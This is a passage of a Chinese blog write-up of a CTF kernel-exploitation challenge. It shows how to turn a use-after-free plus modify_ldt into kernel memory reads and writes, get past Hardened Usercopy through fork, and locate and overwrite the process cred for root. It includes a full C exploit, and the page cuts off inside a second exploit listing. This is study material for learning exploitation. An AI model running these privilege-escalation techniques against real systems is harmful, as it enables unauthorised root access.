error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以通过这个函数重新申请一个ldt结构体绑定到进程上，我们就可以利用uaf控制这个结构题，然后就可以控制其中的<code>entries</code>了。</p>
<p>这个函数处理可以控制ldt以外还可以完成任意写，观察下面的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></table></figure>

<p>在<code>memcpy</code>函数中，拷贝的大小是<code>old_nr_entries * LDT_ENTRY_SIZE</code>,其中<code>old_nr_entries</code>的上限和<code>LDT_ENTRY_SIZE</code>大小都有定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDT_ENTRIES    8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDT_ENTRY_SIZE    8</span></span><br></pre></td></tr></table></figure>

<p>可见还是比较大的，然后还没有加锁，那就可以在<code>memcpy</code>拷贝的期间条件竞争修改<code>entries</code>字段，ldt也是我们传入的值，再执行<code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code>就可以完成任意地址写八字节了。</p>
<h2 id="解法一-遍历内存泄露地址修改进程cred完成提权"><a href="#解法一-遍历内存泄露地址修改进程cred完成提权" class="headerlink" title="解法一 遍历内存泄露地址修改进程cred完成提权"></a>解法一 遍历内存泄露地址修改进程cred完成提权</h2><p>该解法思路主要参考<code>TCTF FINAL</code>的一道kernelpwn题。</p>
<p>乐，整了一天多，就算我把qemu的核增多最后的条件竞争还是不行，而且我确定已经可以控制<code>ldt</code>结构体了，但就是条件竞争失败，哎，虽说没有整出来，但是还是学到了一手遍历内存搜索<code>cred</code>结构体的方法</p>
<p>当开了<code>Hardened Usercopy</code>的时候我们遍历整个<code>page_offset_base</code>还是会报错的，因为<code>task_struct</code>结构体就在这里，而这里是不允许向用户态拷贝的，但是<code>tctf final</code>这道题就提供了一个非常好的思路，就是利用<code>fork</code>机制和<code>ldt</code>结构体绕过<code>Hardened Usercopy</code></p>
<p>首先fork会有如下调用链</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure>

<p>最后的<code>ldt_dup_context()</code>就是负责ldt结构体拷贝的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldt_dup_context</span><span class="params">(struct mm_struct *old_mm, struct mm_struct *mm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以只要我们控制了父进程的<code>ldt-entries</code>指针，就拷贝任意一段内存到子进程的<code>ldt-entries</code>上，而且这是内核向内核拷贝，不会触发保护，然后我们再从子进程中读取<code>ldt-entries</code>就可以了</p>
<p>最后的脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ko_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_free</span><span class="params">(<span class="keyword">size_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=idx;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27;0&#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_edit</span><span class="params">(<span class="keyword">size_t</span> idx,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=idx;</span><br><span class="line">    args[<span class="number">1</span>]=<span class="number">8</span>;</span><br><span class="line">    args[<span class="number">2</span>]=buf;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27;P&#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_add</span><span class="params">(<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=size;</span><br><span class="line">    args[<span class="number">1</span>]=buf;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27; &#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pthread_write</span><span class="params">(<span class="keyword">int</span> v1)</span></span>&#123;</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf=cred_addr+<span class="number">4</span>;</span><br><span class="line">    chunk_edit(<span class="number">1</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] debug\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">u_desc</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">0x2000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> buf2[<span class="number">0x5000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ko_fd=open(<span class="string">&quot;/dev/kernelpwn&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> cred_addr=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cur_pid;</span><br><span class="line">    <span class="keyword">size_t</span> *comm;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    <span class="keyword">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf1,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    chunk_add(<span class="number">0x10</span>,buf1);</span><br><span class="line">    chunk_free(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    u_desc.base_addr=<span class="number">0xff0000</span>;</span><br><span class="line">    u_desc.entry_number=<span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">    u_desc.limit=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_32bit=<span class="number">0</span>;</span><br><span class="line">    u_desc.contents=<span class="number">0</span>;</span><br><span class="line">    u_desc.read_exec_only=<span class="number">0</span>;</span><br><span class="line">    u_desc.limit_in_pages=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_not_present=<span class="number">0</span>;</span><br><span class="line">    u_desc.useable=<span class="number">0</span>;</span><br><span class="line">    u_desc.lm=<span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt,<span class="number">1</span>,&amp;u_desc,<span class="keyword">sizeof</span>(u_desc));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> page_offset_base=<span class="number">0xffff888000000000</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">        <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf1,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            page_offset_base+=<span class="number">0x40000000</span>;</span><br><span class="line">            *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base_addr:%p\n&quot;</span>,page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> addr=page_offset_base;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=addr;</span><br><span class="line">    cur_pid=getpid();</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    prctl(PR_SET_NAME,<span class="string">&quot;jingyinghuaa&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">        <span class="keyword">int</span> pid=fork();</span><br><span class="line">        <span class="keyword">if</span>(!pid)&#123;</span><br><span class="line">            <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf2,<span class="number">0x4000</span>);</span><br><span class="line">            <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;modify_idf again fail\n&quot;</span>);</span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">1</span>); </span><br><span class="line">            &#125;</span><br><span class="line">            comm=(<span class="keyword">size_t</span>*)memmem(buf2,<span class="number">0x4000</span>,<span class="string">&quot;jingyinghuaa&quot;</span>,<span class="number">12</span>);</span><br><span class="line">            <span class="keyword">if</span> (comm \</span><br><span class="line">                &amp;&amp; (comm[<span class="number">-2</span>] &gt; page_offset_base) \</span><br><span class="line">                &amp;&amp; (comm[<span class="number">-3</span>] &gt; page_offset_base) \</span><br><span class="line">                &amp;&amp; (((<span class="keyword">int</span>) comm[<span class="number">-58</span>]) == cur_pid))&#123;</span><br><span class="line">                     cred_addr = comm[<span class="number">-2</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>],&amp;cred_addr,<span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>],&amp;cred_addr,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(cred_addr)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        addr+=<span class="number">0x4000</span>;</span><br><span class="line">        *(<span class="keyword">size_t</span> *)buf1=addr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cred_addr:%p\n&quot;</span>,cred_addr);</span><br><span class="line">    <span class="keyword">int</span> pid_1=fork();</span><br><span class="line">    <span class="keyword">if</span>(!pid_1)&#123;</span><br><span class="line">        <span class="keyword">int</span> pid_2=fork();</span><br><span class="line">        <span class="keyword">if</span>(!pid_2)&#123;</span><br><span class="line">            sleep(<span class="number">3</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;buhaole\n&quot;</span>);</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">1</span>, &amp;cpu_set);</span><br><span class="line">            sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">            *(<span class="keyword">size_t</span> *)buf1=cred_addr+<span class="number">4</span>;</span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                chunk_edit(<span class="number">1</span>,buf1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// sleep(5);</span></span><br><span class="line">        chunk_add(<span class="number">0x10</span>,buf1);</span><br><span class="line">        chunk_free(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;begin to test\n&quot;</span>);</span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">        sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">        u_desc.base_addr = <span class="number">0</span>;</span><br><span class="line">        u_desc.entry_number = <span class="number">2</span>;</span><br><span class="line">        u_desc.limit = <span class="number">0</span>;</span><br><span class="line">        u_desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">        u_desc.contents = <span class="number">0</span>;</span><br><span class="line">        u_desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">        u_desc.lm = <span class="number">0</span>;</span><br><span class="line">        u_desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">        u_desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">        u_desc.useable = <span class="number">0</span>;</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;u_desc, <span class="keyword">sizeof</span>(u_desc));</span><br><span class="line">        sleep(<span class="number">10000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> (geteuid())&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fail\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;okk\n&quot;</span>);</span><br><span class="line">    setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="解法二-遍历内存泄露地址劫持seq-operations-rop提权"><a href="#解法二-遍历内存泄露地址劫持seq-operations-rop提权" class="headerlink" title="解法二 遍历内存泄露地址劫持seq_operations+rop提权"></a>解法二 遍历内存泄露地址劫持seq_operations+rop提权</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>总的来说就是先利用modify_ldt爆破<code>page_0ffset_base</code>这块的线性地址，这段虚拟地址在<code>ret2dir</code>中就学习到过，是一段连续的虚拟地址，一共有64TB,映射了所有的物理内存，<code>kmalloc</code>的内存申请就是在这里进行的，在不开kaslr的时候，<code>page_offset_base=0xffff888000000000</code>,但是本题开了，所以需要爆破这个的地址，爆破就是利用<code>read_ldt</code>来爆破，</p>
<p>代码如下,就是在<code>0xffff888000000000</code>的基础上每次加<code>0x40000000</code>，至于为什么要加<code>0x40000000</code>,我猜测是<code>page_offset_base</code>也是指定的几位随机化，和代码段一样。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> page_offset_base=<span class="number">0xffff888000000000</span>;</span><br><span class="line">   *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">       chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">       <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf1,<span class="number">8</span>);</span><br><span class="line">       <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">           page_offset_base+=<span class="number">0x40000000</span>;</span><br><span class="line">           *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">           <span class="keyword">continue</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base_addr:%p\n&quot;</span>,page_offset_base);</span><br></pre></td></tr></table></figure>

<p>至于为什么不直接爆破kernel的代码段，我尝试了一下，发现了内核会直接报错退出，至于原因，应该是内核开启了 <code>Hardened Usercopy</code>保护，开启这个保护后，在向内核拷贝数据或者从内核中拷贝数据的时候就会进行检查，检查这段内核内存是否在堆栈中，是否是object，是否非内核或者代码段，按我的理解，简而言之，有些内存可以拷贝，比如堆栈，有些就不行，比如代码段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">size_t</span> *)buf1=vmlinux_nokaslr_addr;</span><br><span class="line">   <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">       chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;num:%d\n&quot;</span>,i);</span><br><span class="line">       <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf1,<span class="number">8</span>);</span><br><span class="line">       <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">           vmlinux_nokaslr_addr+=<span class="number">0x100000</span>;</span><br><span class="line">           *(<span class="keyword">size_t</span> *)buf1=vmlinux_nokaslr_addr;</span><br><span class="line">           i++;</span><br><span class="line">           <span class="keyword">continue</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base_addr:%p\n&quot;</span>,vmlinux_nokaslr_addr);</span><br></pre></td></tr></table></figure>

<p>爆破出来<code>page_offset_base</code>,那就可以利用<code>read_ldt</code>在这段地址上读取堆信息，堆中就有kernel_base地址，然后就是<code>seq_operations</code>+内核<code>pt_regs</code>栈迁移打了。</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 